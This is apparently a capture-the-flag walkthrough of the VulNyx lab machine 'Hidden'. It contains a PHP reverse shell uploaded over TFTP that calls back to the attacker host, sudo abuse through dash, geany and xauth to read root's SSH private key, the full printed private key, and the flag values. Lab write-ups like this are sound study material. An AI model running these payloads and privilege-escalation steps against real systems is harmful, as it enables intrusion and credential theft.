# VulNyx - Hidden

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.22
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-21 07:55 +07
Nmap scan report for 10.11.5.22
Host is up (0.0015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 08:00:27:CA:8E:79 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.74 seconds
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sU --top-ports 1000 10.11.5.22
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-21 08:15 +07
Nmap scan report for 10.11.5.22
Host is up (0.0016s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
69/udp  open|filtered tftp
158/udp open|filtered pcmail-srv
MAC Address: 08:00:27:CA:8E:79 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1045.17 seconds
```

#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.22/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.22/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```
```
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.22/ -w /usr/share/wordlists/dirb/common.txt -x php,txt       
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.22/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.hta.txt             (Status: 403) [Size: 275]
/.hta.php             (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/server-status        (Status: 403) [Size: 275]
Progress: 13839 / 13839 (100.00%)
===============================================================
Finished
===============================================================
```

### Shell
**TFTP**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat reverse_shell.php                                 
<?php
$sock = fsockopen("10.11.5.4", 4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ tftp 10.11.5.22 
tftp> put reverse_shell.php
tftp> q

┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -s "http://10.11.5.22/reverse_shell.php" 
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444           
listening on [any] 4444 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.22] 44252
/bin/sh: 0: can't access tty; job control turned off
$ id; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hidden
$ bash -pi
bash: cannot set terminal process group (500): Inappropriate ioctl for device
bash: no job control in this shell
www-data@hidden:/var/www/html$
```
We have shell of `www-data`.

```bash
www-data@hidden:/var/www/html$ sudo -l
sudo -l
sudo: unable to resolve host hidden: Temporary failure in name resolution
Matching Defaults entries for www-data on hidden:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on hidden:
    (satan) NOPASSWD: /usr/bin/dash
```
`dash` is a shell (command-line manager) similar to `bash` (the default on Kali/Ubuntu) or `sh`

Because we have the permission to run a shell `dash` under the `satan` user's name without a password, we can instantly "transform" (horizontal privilege escalation) from `www-data` to `satan`.
```bash    
www-data@hidden:/var/www/html$ sudo -u satan /usr/bin/dash
sudo: unable to resolve host hidden: Temporary failure in name resolution
$ id;hostname
uid=1000(satan) gid=1000(satan) groups=1000(satan)
hidden
$ bash -pi
satan@hidden:/var/www/html$
```
We have shell of `satan`.

#### Flags (user.txt)
```bash
satan@hidden:/var/www/html$ find / -name user.txt 2>/dev/null |xargs cat
2cf56996ccb702cd415d40ed9cdbb93c
```

### Privilege Escalation
#### Enumeration
```bash
satan@hidden:/var/www/html$ sudo -l
sudo: unable to resolve host hidden: Temporary failure in name resolution
Matching Defaults entries for satan on hidden:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User satan may run the following commands on hidden:
    (ALL : ALL) NOPASSWD: /usr/bin/geany, /usr/bin/xauth
```
- **Geany** (`/usr/bin/geany`): This is an extremely lightweight text editor and IDE for Linux. It's similar to Notepad++ on Windows or a stripped-down version of VS Code. It has a graphical user interface (GUI).
- **Xauth** (`/usr/bin/xauth`): This is the X authority file utility for managing graphical display permissions. When you connect to a remote Linux server via SSH and want to open a graphical application (such as Geany or a web browser), xauth is responsible for verifying whether your machine has permission to display that graphical window.

#### Abuse
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh-keygen -t rsa -b 4096 -f /tmp/mykey
Generating public/private rsa key pair.
Enter passphrase for "/tmp/mykey" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/mykey
Your public key has been saved in /tmp/mykey.pub
The key fingerprint is:
SHA256:WvTvhgMwwF25L80oEeaQQIcgWkMk3R89ypE+NZ+tFVE dungcngo@kali
The key's randomart image is:
+---[RSA 4096]----+
|+*B=.o +..  .oE  |
|oooo* B *   .    |
|.    O *.= o .   |
|      @...o o    |
|       =S=.o     |
|      .o+ =.     |
|      .. o ..    |
|          o..    |
|           o.    |
+----[SHA256]-----+

┌──(dungcngo㉿kali)-[/tmp]
└─$ ls    
config-err-gzMqZt
mykey
mykey.pub
...

┌──(dungcngo㉿kali)-[/tmp]
└─$ cat mykey.pub           
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDYmakLR4VenNMdx4mj3f7UR38eox9N5RhjqXv8wP2bZhikYehMFtuVp5TSQpqDx3Z7i6sDYViD0yNTA4K++MkQqVjbWvm6A08z1OYKrwLN5Nfi7VkrTv7BB42w6SiAxTB2iA0dRQ0NQGA1l2a+V3VtKo/mHc4bogiDyG9z/YlzvYUNwj4xt1HQb7RzhfHRJos3XTadfG+Ek1b3tmaNb5OxMSyMC75kovidD1PcAOiHXmjjosAHkZuIBUP78xAFdCEl2/vn5UyQgboeW9os4O6tEwzGk5lGeOYVFzIXV1imVDw7iXSVX0hz7SfgXCRbK3UXrD4CCWQEXUIEy4HCnd5Pul0p7rpDSdI3dW0zettIqg3IVHCbUTnf9gRWUyB8wjZtpjLsyNsvALH1jpakDGAjwOkMm9r0fk3AQElOeeEWQ2tMwQE+LsEtEPSvDkWeCiU+VCSu9YpG5l7v2vrDV96a7GpYIrulijFGrWsOD5vg4EC6QDkgYB9Maeyx7KZXqR/0ZJlrQzNPRoAZKOA48K0Cpa1KMJ7BG0VDXi+U/oggP5TVHTXLGxWMk0m3JYWU2lpoLPfcgkOblGHx8gSP5DEKPereSezs6ckKTwEhIv+hbsgbbWpfQiQ2BxaXb+Xc97pRFwx6na8P/sOk4eyv3OcV2n+KdQApJaIV3EkQaEz2rQ== dungcngo@kali
```
```bash
satan@hidden:~$ mkdir ~/.ssh
satan@hidden:~$ chmod 700 ~/.ssh
satan@hidden:~$ cd ~/.ssh
satan@hidden:~/.ssh$ nano authorized_keys 
satan@hidden:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDYmakLR4VenNMdx4mj3f7UR38eox9N5RhjqXv8wP2bZhikYehMFtuVp5TSQpqDx3Z7i6sDYViD0yNTA4K++MkQqVjbWvm6A08z1OYKrwLN5Nfi7VkrTv7BB42w6SiAxTB2iA0dRQ0NQGA1l2a+V3VtKo/mHc4bogiDyG9z/YlzvYUNwj4xt1HQb7RzhfHRJos3XTadfG+Ek1b3tmaNb5OxMSyMC75kovidD1PcAOiHXmjjosAHkZuIBUP78xAFdCEl2/vn5UyQgboeW9os4O6tEwzGk5lGeOYVFzIXV1imVDw7iXSVX0hz7SfgXCRbK3UXrD4CCWQEXUIEy4HCnd5Pul0p7rpDSdI3dW0zettIqg3IVHCbUTnf9gRWUyB8wjZtpjLsyNsvALH1jpakDGAjwOkMm9r0fk3AQElOeeEWQ2tMwQE+LsEtEPSvDkWeCiU+VCSu9YpG5l7v2vrDV96a7GpYIrulijFGrWsOD5vg4EC6QDkgYB9Maeyx7KZXqR/0ZJlrQzNPRoAZKOA48K0Cpa1KMJ7BG0VDXi+U/oggP5TVHTXLGxWMk0m3JYWU2lpoLPfcgkOblGHx8gSP5DEKPereSezs6ckKTwEhIv+hbsgbbWpfQiQ2BxaXb+Xc97pRFwx6na8P/sOk4eyv3OcV2n+KdQApJaIV3EkQaEz2rQ== dungcngo@kali
satan@hidden:~/.ssh$ chmod 600 authorized_keys 
```
In our Kali machine:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh -i mykey -X satan@10.11.5.22
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux hidden 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64
Last login: Mon May  1 13:39:39 2023 from 192.168.1.10
/usr/bin/xauth:  file /home/satan/.Xauthority does not exist
satan@hidden:~$ geany
```
![geany](/walkthroughs/vulnyx/easy_difficulty/05_hidden/geany.png)

```bash
satan@hidden:~$ sudo /usr/bin/xauth add $(xauth list $DISPLAY)
sudo: unable to resolve host hidden: Fallo temporal en la resolución del nombre

satan@hidden:~$ sudo /usr/bin/geany /root/.ssh/id_rsa
```
![id_rsa](/walkthroughs/vulnyx/easy_difficulty/05_hidden/id_rsa.png)

Copy `id_rsa` private key to Kali machine.

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nano id_rsa
                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat id_rsa                                   
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEArFtU+4/gYolb9wpYziv1qJyIcLkKd6Puc8b8FcxepAVwzEQx
eIIm0kntinecWJHxB+86dG2ZvSwvh2RNCsuFgfs1XI4aAuk8FNJSn/Wgbe4QXSl9
IjvHhrxPhCRYcxZEVpSoK2gAmzt5F+LWEx+IzI7H+HG6Nxbk0vGmKZT6aIc+rZE/
RaXlRBBx/DMvE4pK4cN8hiSmlCyNolPZeKqheqgK07w9RWdN90AgEkzyZIuRF4qW
9L0l4gaXuXBWBkw1TtiNmZmZUSUFbBBISHlys/Z1PwBnxFtvKismJBdnI5UfzyAE
TeOJyD/RgD9L0n53qlYp5iHQ7k6XweNqe7i1fQIDAQABAoIBAFyHP405hT2A/kUW
Yex0/xHAzyKsxCjMcePnzEcrixdE8HRIm8JVJOA53fM7GU0XNC2NSXVdrW44PV/T
AeUss4S/RrtkciRj7+RBsSe8pp69cj2BW3M4Yno7t/h5xp4qMw/ECLAcyk6L1At1
tHVZtYgTktkWvOB8QuXX4ttp5jCcn8Q9AJxfHfdy0UZYGql+NuZJyRRfZ5c5TBLK
EpxxJDWiAN8s4g3EhjEZerJ341he0nixO99FbgoeWCx5LoOXsaNoqgn7lxmPZGao
nX/DAsicwtdsnYwSoIrQJiOVDWjx6f1BClHvvHAy2E2jabTvj8Ac4Pa5Cionl5lA
DHTIX0UCgYEA6YzS6j+qfccv1qov4Lt9XOYEqOXQprxExNFu53ksHdKDNX0bPlew
oqTBr81cHNNa8xYAK7iIsEyamPVkuWEgd+FO+1qqwZldXH2NoHr3RwLHIakjCLn6
2vc5TDZbLWQpNKhdAXmB81yULjNqfH7C1+XFL3VZ9/WJcSd6rzNyR/8CgYEAvOyr
SpJsOij0bAQu+IB01Ny1DyyEFMAviIXCP9BNYzxLO9KtEMAo+rG4cF8dzYKuC9Rx
18kmmmPjwo5lIa+GAAMTlXFS2p65Z/Ce0DoQ+GAjXG6VkctqKEC002dgyPzjjhRs
6Dh3KosjXWLwRnGi5Pl7Wkz3i0vlSq/rlRVSIoMCgYBleJPixsqSX0p/n+2xXIR5
Kk73+vGOn9nZEY138IOkaWQshzChA4RxBdhJQ5Yzx/iKCRMF6+UnhADfWC7tBDAR
JcklGB18g9+2Ya54/TQWnDRcgZoBHpzJKgSxAiTXMd9dS5EtJNe7HowbDqfDc2fA
Wco0dm4id4HBsf9xw45xjQKBgEbI+gjvwaMs8x+BlcPABYY3x5MO39ISi/y/+R8F
wekbjyiz7+olxXTgn7VivfzhKKsAB0ONd2xDXvPnfFbZuABLJsxIcH2/GMKr8iUc
jH0zMCyStnGw4G6Ch/3pbub/cZcraf68IVIMXczApDwQmbLnEuOrkNhdMGUCcuch
3OtXAoGBAK8qoNC4XTuMN929fL3+u30BkViHhAdca7g5L4FtRVi05pgGdPzrjApS
WyoluiW8R/mrRHkVUaBaC0NThIUh/zrIwPrihVUjXY8ntuzN02q8241Yq6FJ9Gim
3wtCc9dVXIH9JRd+0vd089Tfh5WZZg/NUVYiFH4pASsIrKbHW7Gw
-----END RSA PRIVATE KEY-----

┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh2john id_rsa > id_rsa.hash
id_rsa has no password!

┌──(dungcngo㉿kali)-[/tmp]
└─$ chmod 600 id_rsa
```
We log into `root` user by `ssh`.
```bash                                                                           ┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh -i id_rsa root@10.11.5.22
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux hidden 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64
Last login: Thu Jul 13 23:31:02 2023
root@hidden:~# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
hidden
```

#### Flags (root.txt)
```bash
root@hidden:~# ls -la
total 48
drwx------  6 root root 4096 may 21 05:48 .
drwxr-xr-x 18 root root 4096 abr 30  2023 ..
lrwxrwxrwx  1 root root    9 abr 23  2023 .bash_history -> /dev/null
-rw-------  1 root root 3526 ene 15  2023 .bashrc
drwx------  3 root root 4096 may 21 05:49 .cache
drwx------  3 root root 4096 may 21 05:49 .config
drw-------  3 root root 4096 ene 15  2023 .local
-rw-------  1 root root  161 jul  9  2019 .profile
-r--------  1 root root   33 abr 30  2023 .root.txt
-rw-r--r--  1 root root   66 abr 30  2023 .selected_editor
-rwxr-xr-x  1 root root   95 abr 30  2023 .service
drwx------  2 root root 4096 abr 30  2023 .ssh
-rw-------  1 root root   52 may 21 05:46 .Xauthority
root@hidden:~# cat ~/.root.txt
24f5fe7b1073be0a6f85159d22beaa7a
```

***You are welcome!***
